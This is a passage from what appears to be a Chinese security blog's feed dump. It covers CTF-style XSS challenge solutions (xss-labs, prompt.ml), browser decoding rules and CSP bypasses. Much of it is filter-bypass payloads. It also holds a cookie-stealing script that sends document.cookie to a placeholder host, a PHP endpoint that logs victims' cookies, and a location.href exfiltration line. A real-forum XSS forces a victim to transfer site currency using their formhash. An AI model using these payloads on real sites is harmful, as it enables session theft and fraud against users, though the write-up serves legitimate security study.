align=center&gt;没有找到和&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;javascript:alert(1);&amp;quot;&amp;gt;aaa&amp;lt;/a&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level6.php method=GET&gt; &lt;input name=keyword  value=&quot;&quot;&gt;&lt;a hr_ef=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>payload：(大写可以绕过)</p><pre><code> &quot;&gt; &lt;a Href=&quot;javascript:alert(/1/)&quot;&gt;axxx&lt;/a&gt;</code></pre><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><pre><code> &lt;form action=level7.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;&gt;alert(1)&lt;/&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p><code>script</code> , <code>on</code>被过滤</p><p>payload</p><pre><code> &quot; oonninput=alert(1) &quot; &quot;oonnmouseover=&quot;alert(1)</code></pre><p>然后输入即可</p><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>将 <code>javascript:alert(1)</code>  html实体编码即可</p><pre><code> &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</code></pre><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>将 </p><pre><code> javascript:alert(1) </code></pre><p>html实体编码，然后加上 <code>%0d</code></p><pre><code> &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x0a;%0dhttp://www.0aa.me%0dalert(1)</code></pre><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>这一关有点玄学</p><pre><code> &amp;t_sort=&quot; type=&quot;text&quot;onmouseover=alert`1` &quot;</code></pre><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>添加 referer </p><pre><code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><p><img src="/posts/88edfa78/1582880021264.png" alt="img"></p><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>在User-agent 处注入</p><pre><code> &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>在cookie处注入</p><pre><code> &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><h3 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h3><p>iframe 引入了</p><pre><code> &lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;</code></pre><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>angular js</p><pre><code> http://localhost/xss_test/level15.php?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></pre><h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>%0a 绕过空格</p><pre><code> http://localhost/xss_test/level16.php?keyword=%3Cimg%0asrc=1%0aonerror=alert(1)%3E</code></pre><p>level17-20 都是flash相关的xss，就不写了</p><h2 id="prompt1-to-win"><a href="#prompt1-to-win" class="headerlink" title="prompt1 to win"></a>prompt1 to win</h2><p><a href="http://prompt.ml/0" target="_blank" rel="noopener">http://prompt.ml/0</a></p><h3 id="0"><a href="#0" class="headerlink" title="0"></a>0</h3><pre><code> &quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;&lt;&quot;</code></pre><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><pre><code> function escape(input) {     // tags stripping mechanism from ExtJS library     // Ext.util.Format.stripTags     var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;     input = input.replace(stripTagsRE, &#39;&#39;);      return &#39;&lt;article&gt;&#39; + input + &#39;&lt;/article&gt;&#39;; }        </code></pre><p>不能闭合标签</p><pre><code> &lt;body/onload=prompt(1)// &lt;body onload=prompt(1)//</code></pre><p><code>onload</code> 事件属性，在页面加载之后立即执行一段JavaScript</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><pre><code> function escape(input) {     //                      v-- frowny face     input = input.replace(/[=(]/g, &#39;&#39;);      // ok seriously, disallows equal signs and open parenthesis     return input; }        </code></pre><p>使用svg即可</p><pre><code> &lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;  &lt;svg&gt;&lt;script&gt;prompt&amp;#x28 1)&lt;/script&gt;</code></pre><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><pre><code> function escape(input) {     // filter potential comment end delimiters     input = input.replace(/-&gt;/g, &#39;_&#39;);      // comment the input to avoid script execution     return &#39;&lt;!-- &#39; + input + &#39; --&gt;&#39;; }        </code></pre><p>新姿势get</p><pre><code> --!&gt;&lt;script&gt;prompt(1)&lt;/script</code></pre><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><pre><code>function escape(input) {    // make sure the script belongs to own site    // sample script: http://prompt.ml/js/test.js    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {        var script = document.createElement(&#39;script&#39;);        script.src = input;        return script.outerHTML;    } else {        return &#39;Invalid resource.&#39;;    }}        </code></pre><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><pre><code>function escape(input) {    // apply strict filter rules of level 0    // filter &quot;&gt;&quot; and event handlers    input = input.replace(/&gt;|on.+?=|focus/gi, &#39;_&#39;);    return &#39;&lt;input value=&quot;&#39; + input + &#39;&quot; type=&quot;text&quot;&gt;&#39;;}      </code></pre><p>新姿势。。</p><pre><code>&quot;type=image src onerror=&quot;prompt(1)</code></pre><p>或者</p><pre><code>&quot;type=image src onerror=prompt(1) </code></pre><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><pre><code> function escape(input) {     // let&#39;s do a post redirection     try {         // pass in formURL#formDataJSON         // e.g. http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}         var segments = input.split(&#39;#&#39;);         var formURL = segments[0];         var formData = JSON.parse(segments[1]);          var form = document.createElement(&#39;form&#39;);         form.action = formURL;         form.method = &#39;post&#39;;          for (var i in formData) {             var input = form.appendChild(document.createElement(&#39;input&#39;));             input.name = i;             input.setAttribute(&#39;value&#39;, formData[i]);         }          return form.outerHTML + &#39;                         \n\ &lt;script&gt;                                                  \n\     // forbid javascript: or vbscript: and data: stuff    \n\     if (!/script:|data:/i.test(document.forms[0].action)) \n\         document.forms[0].submit();                       \n\     else                                                  \n\         document.write(&quot;Action forbidden.&quot;)               \n\ &lt;/script&gt;                                                 \n\         &#39;;     } catch (e) {         return &#39;Invalid form data.&#39;;     } }      </code></pre><p>代码很复杂，但是其实就是一个构造表单的过程</p><p><img src="/posts/88edfa78/1582896974234.png" alt="img"></p><p>如果使用JavaScript伪协议，被过滤了</p><pre><code> javascript:prompt(1)#{&quot;test&quot;:1}</code></pre><p>新姿势：</p><p>action有这样的一个特性，如果前后都有action，访问action标签时访问的是后面的action的值。</p><p>所以如果输入</p><pre><code> javascript:prompt(1)#{&quot;action&quot;:1}</code></pre><p>得到的结果</p><pre><code> &lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=&quot;1&quot;&gt;&lt;/form&gt;                          &lt;script&gt;                                                       // forbid javascript: or vbscript: and data: stuff         if (!/script:|data:/i.test(document.forms[0].action))          document.forms[0].submit();                            else                                                           document.write(&quot;Action forbidden.&quot;)                &lt;/script&gt;     </code></pre><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><pre><code> function escape(input) {     // filter potential start-tags     input = input.replace(/&lt;([a-zA-Z])/g, &#39;&lt;_$1&#39;);     // use all-caps for heading     input = input.toUpperCase();      // sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!     return &#39;&lt;h1&gt;&#39; + input + &#39;&lt;/h1&gt;&#39;; }     </code></pre><p>payload如下</p><pre><code> &lt;ſcript/ſrc=//⒕₨&gt;&lt;/ſcript&gt;</code></pre><p><img src="/posts/88edfa78/1582897922738.png" alt="img"></p><h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><pre><code> function escape(input) {     // (╯°□°）╯︵ ┻━┻     input = encodeURIComponent(input).replace(/prompt/g, &#39;alert&#39;);     // ┬──┬ •ノ( ゜-゜ノ) chill out bro     input = input.replace(/&#39;/g, &#39;&#39;);      // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO     return &#39;&lt;script&gt;&#39; + input + &#39;&lt;/script&gt; &#39;; }        </code></pre><p>组合一下。</p><pre><code> prom&#39;pt(1)</code></pre><h2 id="XSS基础知识"><a href="#XSS基础知识" class="headerlink" title="XSS基础知识"></a>XSS基础知识</h2><pre><code>&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://xxxx/a?&quot;+escape(document.cookie);&lt;/script&gt;</code></pre><p>escape一般会进行URL编码，但是 该方法不会对 ASCII 字母和数字进行编码，也不会对下面这些 ASCII 标点符号进行编码： * @ - _ + . / 。其他所有的字符都会被转义序列替换。</p><p>常用的payload</p><pre><code> &lt;script&gt;alert(/xss/);&lt;/script&gt; //经典语句  &lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt; &lt;img src=x onerror=alert(1)&gt; &lt;svg onload=alert(1)&gt; &lt;a href = javasript:alert(1)&gt;</code></pre><h3 id="简单地XSS接收平台"><a href="#简单地XSS接收平台" class="headerlink" title="简单地XSS接收平台"></a>简单地XSS接收平台</h3><p>js脚本</p><pre><code> var img = document.createElement(&quot;img&quot;); img.src = &quot;http://xxx/x.php?cookie=&quot;+document.cookie; document.body.appendChild(img);</code></pre><p>接收端</p><pre><code> &lt;?php   $victim = &#39;XXS得到的 cookie:&#39;. $_SERVER[&#39;REMOTE_ADDR&#39;]. &#39;:&#39; .$_GET[&#39;cookie&#39;].&quot;\r\n\r\n&quot;;   echo htmlspecialchars($_GET[&#39;cookie&#39;]); $myfile = fopen(&quot;/aixi/XSS/xss_victim.txt&quot;, &quot;a&quot;); fwrite($myfile, $victim); ?&gt;</code></pre><h3 id="从浏览器解码看xss"><a href="#从浏览器解码看xss" class="headerlink" title="从浏览器解码看xss"></a>从浏览器解码看xss</h3><h4 id="html编码解码"><a href="#html编码解码" class="headerlink" title="html编码解码"></a>html编码解码</h4><p>浏览器会先解析html，然后解析xss，所以，如果在xss中使用到了html实体编码是没有用的</p><pre><code> &lt;script&gt;alert&amp;#40;&#39;1&#39;)&lt;/script&gt;</code></pre><p>但是却可以触发，原因是 svg支持xml,在XML中实体会自动转义,除了<code>&lt;![CDATA[</code>和<code>]]&gt;</code>包含的实体</p><pre><code> &lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</code></pre><h4 id="JavaScript编码解码"><a href="#JavaScript编码解码" class="headerlink" title="JavaScript编码解码"></a>JavaScript编码解码</h4><p>下面无法触发，原因是浏览器看到 <code>onerror</code> 之后，调用js解析器，但是在js中，<strong>单引号，双引号和圆括号等属于控制字符，编码后将无法识别。所以对于防御来说，应该编码这些控制字符</strong></p><pre><code>&lt;img src=&quot;1&quot; onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029&gt;</code></pre><p>所以我们需要修改成这样</p><pre><code>&lt;img src=&quot;1&quot; onerror=\u0061\u006c\u0065\u0072\u0074(&#39;\u0031&#39;)&gt;</code></pre><p>结合上面的html编码，我们可以将 <code>\u0061\u006c\u0065\u0072\u0074(&#39;\u0031&#39;)</code> 再进行一次html实体编码(这样就算你过滤了 <code>&#39;</code>,照样可以绕过)</p><pre><code>&lt;img src=&quot;1&quot; onerror=&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;&amp;#40;&amp;#39;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#51;&amp;#49;&amp;#39;&amp;#41;&gt;</code></pre><p>比如开发人员单纯的设置HTML实体编码为防御xss的手段，但是用户输入点确实在alert中</p><pre><code>&lt;img src = &quot;https://text.com&quot; onclick = &#39;alert(输入点)&#39;&gt;</code></pre><p>如果用户正常输入的话凡是存在<code>&lt;</code> ,<code>&quot;</code> 等都能被转码</p><p>但是攻击者可以通过语句<code>&quot;);alert(&quot;test</code> 然后HTML编码即可绕过</p><pre><code>&lt;img src = &quot;https://gss1.bdstatic.com&quot; onclick = &#39;alert(&quot;FIRST XSS | &amp;#34;&amp;#41;&amp;#59;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#116;&amp;#101;&amp;#115;&amp;#116;&quot;)&#39;&gt;</code></pre><p>发现弹窗了两次,是因为服务端进行一个HTML解码发现存在两个<code>alert()</code>弹窗于是直接弹</p><p>所以对于这种情况，正确防御XSS的方法应该是先javascript编码然后再进行HTML编码</p><h4 id="URL编码解码"><a href="#URL编码解码" class="headerlink" title="URL编码解码"></a>URL编码解码</h4><pre><code>&lt;a href = &quot;javascript:alert(3)&quot;&gt;hhhhh&lt;a&gt;</code></pre><p>浏览器看到<code>&lt;</code>满足HTML解码的条件，然后看到<code>href</code> 满足了URL编码额条件，最后看到<code>javascript</code>满足JS 解码的条件</p><p>于是我们可以反过来编码</p><p>作为攻击者我们应该反过来首先进行一个JS编码</p><pre><code> &lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>然后进行一个URL编码</p><pre><code> &lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>最后进行一个HTML编码</p><pre><code> &lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>其他栗子：</p><pre><code> &lt;a onclick=&quot;window.open(&#39;value1&#39;)&quot; href=&quot;javascript:window.open(value2)&quot;&gt;</code></pre><p>这里的value1：浏览器看到<code>&lt;</code>标签，可以HTML解码，然后看到<code>onclick</code>可以进行JS解码，最后看到<code>window.open</code>可以进行URL解码</p><p>对于value2而言：浏览器看到<code>&lt;</code>标签进行一个HTML解码，然后看到<code>href</code>进行一个URL解码，再之后看到<code>javascript</code>进行一个JS解码，最后看到了<code>window.open</code>编码进行一个URL解码</p><h3 id="XSS-payload判断是否执行练习"><a href="#XSS-payload判断是否执行练习" class="headerlink" title="XSS payload判断是否执行练习"></a>XSS payload判断是否执行练习</h3><h4 id="1-协议被编码导致无法执行"><a href="#1-协议被编码导致无法执行" class="headerlink" title="1 协议被编码导致无法执行"></a>1 协议被编码导致无法执行</h4><pre><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></pre><p>href 丢给URL模块解析，但是协议无法识别（即被编码的<code>javascript:</code>），解码失败，不会被执行</p><h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><pre><code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;</code></pre><p>先进行htm解码得到  </p><pre><code>javascript:%61%6c%65%72%74%28%32%29</code></pre><p>然后href丢给URL模块解析，得到</p><pre><code>javascript:alert(2)</code></pre><p>可以执行</p><h4 id="3-协议被编码，同1"><a href="#3-协议被编码，同1" class="headerlink" title="3 协议被编码，同1"></a>3 协议被编码，同1</h4><pre><code>&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</code></pre><h4 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h4><pre><code>&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</code></pre><p>无法执行，因为从HTML解析机制看，在读取<code>&lt;div&gt;</code>之后进入数据状态，<code>&amp;#60;</code>会被HTML解码，但不会进入标签开始状态，当然也就不会创建<code>img</code>元素，也就不会执行</p><h4 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h4><pre><code>&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</code></pre><p>无法执行，<code>&lt;textarea&gt;</code>是<code>RCDATA</code>元素（RCDATA elements），可以容纳文本和字符引用，注意<strong>不能容纳其他元素</strong>，HTML解码得到</p><pre><code>&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;</code></pre><h4 id="6-同5-无法执行"><a href="#6-同5-无法执行" class="headerlink" title="6  同5 无法执行"></a>6  同5 无法执行</h4><pre><code>&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;</code></pre><h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><pre><code>&lt;button onclick=&quot;confirm(&#39;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;</code></pre><p>这里<code>onclick</code>中为标签的属性值（类比2中的<code>href</code>），会被HTML解码，得到</p><pre><code>&lt;button onclick=&quot;confirm(&#39;7&#39;);&quot;&gt;Button&lt;/button&gt;</code></pre><p>然后被执行</p><h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><pre><code> &lt;button onclick=&quot;confirm(&#39;8\u0027);&quot;&gt;Button&lt;/button&gt;</code></pre><p><code>onclick</code>中的值会交给JS处理，在JS中只有字符串和<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Identifier" target="_blank" rel="noopener">标识符</a>能用Unicode表示，<code>&#39;</code>显然不行，JS执行失败</p><h4 id="9-1"><a href="#9-1" class="headerlink" title="9"></a>9</h4><pre><code> &lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</code></pre><p>无法执行</p><p><code>script</code>属于原始文本元素(Raw text elements)，<strong>只可以容纳文本</strong>，注意<strong>没有字符引用</strong>，于是直接由JS处理，JS也认不出来，执行失败</p><p>原始文本元素(Raw text elements)有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></p><h4 id="10"><a href="#10" class="headerlink" title="10"></a>10</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</code></pre><p>这里js中可以使用Unicode的，只是有些特殊字符不能编码，可以执行</p><h4 id="11-同8，关键字符被编码"><a href="#11-同8，关键字符被编码" class="headerlink" title="11 同8，关键字符被编码"></a>11 同8，关键字符被编码</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;/script&gt;</code></pre><p>不能执行</p><h4 id="12-由于解码是字符串导致无法执行"><a href="#12-由于解码是字符串导致无法执行" class="headerlink" title="12 由于解码是字符串导致无法执行"></a>12 由于解码是字符串导致无法执行</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;/script&gt;</code></pre><p>这里看似将没毛病，但是这里<code>\u0031\u0032</code>在解码的时候会被解码为字符串<code>12</code>，注意是<strong>字符串</strong>，不是数字，文字显然是需要引号的，JS执行失败</p><p>这样就行了</p><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&quot;\u0031\u0032&quot;)&lt;/script&gt;</code></pre><h4 id="14-同8无法执行"><a href="#14-同8无法执行" class="headerlink" title="14 同8无法执行"></a>14 同8无法执行</h4><pre><code> &lt;script&gt;alert(&#39;13\u0027)&lt;/script&gt;</code></pre><h4 id="15"><a href="#15" class="headerlink" title="15"></a>15</h4><pre><code> &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;/a&gt;</code></pre><p>html解码，得到</p><pre><code> javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</code></pre><p>href识别出是JavaScript协议，URL解码得到</p><pre><code> javascript:\u0061\u006c\u0065\u0072\u0074(15)</code></pre><p>可以执行</p><p>总结</p><ol><li><script>和<style>数据只能有文本，不会有HTML解码和URL解码操作</li><li><code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>里会有HTML解码操作，但不会有子元素</li><li>其他元素数据（如<code>div</code>）和元素属性数据（如<code>href</code>）中会有HTML解码操作</li><li>部分属性（如<code>href</code>）会有URL解码操作，但URL中的协议需为ASCII</li><li>JavaScript会对字符串和标识符Unicode解码</li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="tools网站markdown渲染导致xss"><a href="#tools网站markdown渲染导致xss" class="headerlink" title="tools网站markdown渲染导致xss"></a>tools网站markdown渲染导致xss</h3><p><a href="https://www.hackersb.cn/hacker/235.html" target="_blank" rel="noopener">参考</a></p><p>JavaScript伪协议直接弹框</p><p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874638329.png" alt="img"></p><p>Discuz的每一步操作都需要 formhash,获取到这个值之后就可以了</p><p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874680248.png" alt="img"></p><p>使用图片来触发xss</p><p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874701778.png" alt="img"></p><p>最后的payload</p><pre><code> ![头像&quot; onload=alert(1);//](https://www.t00ls.net/uc_server/data/avatar/000/01/08/66_avatar_middle.jpg)</code></pre><p>之后编写js代码来偷走tubi，</p><pre><code> var formhash = document.getElementsByName(&#39;formhash&#39;)[0].value; fetch(&quot;https://www.t00ls.net/misc.php?action=userrate&amp;userratesubmit=yes&amp;infloat=yes&amp;inajax=1&amp;inajax=1&quot;, {   method: &quot;POST&quot;,   credentials: &quot;include&quot;,   headers: {     &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,     &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,     &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,     &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,     &quot;Connection&quot;: &#39;keep-alive&#39;,   },   body: &quot;formhash=&quot; + formhash + &quot;&amp;tid=39705&amp;do=dashang&amp;handlekey=userrate&amp;score=%2B10&amp;reason=thanks&quot; }).then(function(res) {   if (res.ok) {     alert(&quot;谢谢你的10Tubi！！！&quot;);   } }, function(e) {   alert(&quot;Error submitting form!&quot;); });</code></pre><p>然后插入图片，引用这个js即可</p></script></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过CSP</title>
      <link href="/posts/1e1d8fb4/"/>
      <url>/posts/1e1d8fb4/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><table><thead><tr><th><code>default-src</code></th><th><code>&#39;self&#39; cdn.example.com</code></th><th>定义资源默认加载策略</th></tr></thead><tbody><tr><td><code>script-src</code></td><td><code>&#39;self&#39; js.example.com</code></td><td>定义 JS 加载策略</td></tr><tr><td><code>style-src</code></td><td><code>&#39;self&#39; css.example.com</code></td><td>定义 CSS 加载策略</td></tr><tr><td><code>img-src</code></td><td><code>&#39;self&#39; img.example.com</code></td><td>定义图片加载策略</td></tr><tr><td><code>connect-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td><code>font-src</code></td><td><code>font.example.com</code></td><td>定义 Font 加载策略</td></tr><tr><td><code>object-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 、、 等引用资源加载策略</td></tr><tr><td><code>media-src</code></td><td><code>media.example.com</code></td><td>定义</td></tr><tr><td><code>frame-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 Frame 加载策略</td></tr><tr><td><code>sandbox</code></td><td><code>allow-forms allow-scripts</code></td><td>对页面的操作应用限制，包括阻止弹出窗口，阻止插件和脚本的执行以及强制执行同源策略。可以不设置sanbox的值使得所有限制启用，或者手动启用以下属性 : <code>allow-forms</code> <code>allow-same-origin</code> <code>allow-scripts</code> <code>allow-popups</code>, <code>allow-modals</code>, <code>allow-orientation-lock</code>, <code>allow-pointer-lock</code>, <code>allow-presentation</code>, <code>allow-popups-to-escape-sandbox</code>, and <code>allow-top-navigation</code></td></tr><tr><td><code>report-uri</code></td><td><code>/some-report-uri</code></td><td>指定浏览器报告策略错误的URL，可以在HTTP头中添加<code>-Report-Only</code> 来指示浏览器只报告不阻断</td></tr><tr><td><code>child-src</code></td><td><code>&#39;self&#39;</code></td><td>child-src指令管理了套嵌浏览的部分（类似于iframe、frame标签）</td></tr><tr><td><code>form-action</code></td><td><code>&#39;self&#39;</code></td><td>定义了form表单中action的范围</td></tr><tr><td><code>frame-ancestors</code></td><td><code>&#39;none&#39;</code></td><td>定义<code>&lt;frame&gt;</code> <code>&lt;iframe&gt;</code> <code>&lt;object&gt;</code> <code>&lt;embed&gt;</code> <code>&lt;applet&gt;</code>加载策略. 直接设置<code>‘none’</code> 几乎等于设置了<code>X-Frame-Options: DENY</code></td></tr><tr><td><code>plugin-types</code></td><td><code>application/pdf</code></td><td>设置有效的MIME类型</td></tr></tbody></table><h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><h3 id="使用CDN绕过"><a href="#使用CDN绕过" class="headerlink" title="使用CDN绕过"></a>使用CDN绕过</h3><p>一般来说，前端会用到许多的前端框架和库，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险</p><p>案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP</p><pre><code class="html">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;unsafe-eval&#39; https://cdnjs.cloudflare.com;&quot;&gt;&lt;!-- foo=&quot;--&gt;&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app&gt;    {{constructor.constructor('alert(document.cookie)')()}}&lt;/div&gt;</code></pre><p><a href="https://github.com/hackmdio/codimd/pull/1112/commits/067cfe2d1eedc5a58e5548785858e38fbaa0e84b" target="_blank" rel="noopener">修复</a></p><p><a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">orange师傅的文章</a></p><p>利用条件:</p><ol><li>CDN服务商存在某些低版本的js库</li><li>此CDN服务商在CSP白名单中</li></ol><h3 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h3><p>通过页面跳转功能来实现</p><pre><code>location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</code></pre><h3 id="link标签绕过-比较老了"><a href="#link标签绕过-比较老了" 